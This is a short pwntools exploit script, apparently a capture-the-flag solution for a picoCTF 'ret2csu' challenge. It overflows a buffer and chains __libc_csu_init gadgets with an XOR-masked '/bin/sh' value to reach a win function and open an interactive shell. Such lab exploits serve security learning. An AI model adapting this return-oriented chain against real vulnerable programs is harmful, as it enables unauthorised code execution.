#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./ret2csu", checksec=False)
libc = exe.libc

warn = lambda x, msg="Test": log.warn(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

def conn():
    if args.REMOTE: 
        return remote("saturn.picoctf.net", 65497)
    else: 
        return process()
p = conn()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x00000000004007AF
        c
	''')
#input()

csuPop = 0x400896
csuMov = 0x400880
csuNop = 0x600e48
ret2win = 0x4007B1

payload = flat(
        b'A'*32, exe.bss(400),
        csuPop, 0, 0, 1, csuNop, 0, 0, 0xAACCA9D1D4D7DCC0 ^ u64(b'/bin/sh\0'),
        csuMov, 0, 0, 1, csuNop, 0, 0, 0xAACCA9D1D4D7DCC0 ^ u64(b'/bin/sh\0'),
        ret2win + 1
        )

sla(b"> ", payload)

p.interactive()
